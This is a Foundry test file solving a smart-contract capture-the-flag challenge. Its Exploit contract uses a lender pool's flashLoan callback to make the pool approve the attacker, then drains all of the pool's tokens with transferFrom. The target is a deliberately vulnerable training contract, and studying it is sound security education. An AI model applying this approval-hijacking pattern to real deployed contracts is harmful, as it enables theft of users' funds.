// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";


contract Challenge1Test is Test {
    InSecureumLenderPool target; 
    IERC20 token;

    address player = makeAddr("player");

    function setUp() public {

        token = IERC20(address(new InSecureumToken(10 ether)));
        
        target = new InSecureumLenderPool(address(token));
        token.transfer(address(target), 10 ether);
        
        vm.label(address(token), "InSecureumToken");
    }

    function testChallenge() public {        
        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        uint256 contractBalance = token.balanceOf(address(target));
        Exploit exploit = new Exploit();
        target.flashLoan(
          address(exploit),
          abi.encodeWithSignature(
            "troll(address,uint256)", player, contractBalance
          )
        );

        token.transferFrom(address(target), player, contractBalance);

        //============================//

        vm.stopPrank();

        assertEq(token.balanceOf(address(target)), 0, "contract must be empty");
    }
}


/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract Exploit {
    IERC20 public token;

    function troll(address _player, uint256 _amount) external {
        token.approve(_player, _amount);
    }
}